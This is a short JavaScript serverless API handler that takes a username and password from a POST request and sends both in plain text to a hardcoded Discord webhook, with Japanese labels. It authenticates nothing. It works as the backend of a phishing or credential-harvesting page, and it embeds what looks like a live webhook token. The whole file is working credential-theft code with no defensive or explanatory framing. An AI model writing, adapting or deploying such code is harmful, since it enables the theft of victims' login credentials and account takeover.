export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).end();
  const { username, password } = req.body || {};
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1571557398705995907/edLaJ_MhynSnj52oc4P5JggLUXkyyGSiumb8ouMEjPCoDubxWNSP0sZPrNmuIfqWbqW4";
  try {
    const discordRes = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `ユーザー名: ${username}\nパスワード: ${password}`
      })
    });
    if (discordRes.ok) {
      res.status(200).json({ success: true });
    } else {
      res.status(500).json({ error: "Discord error" });
    }
  } catch (err) {
    res.status(500).json({ error: "Server error" });
  }
}
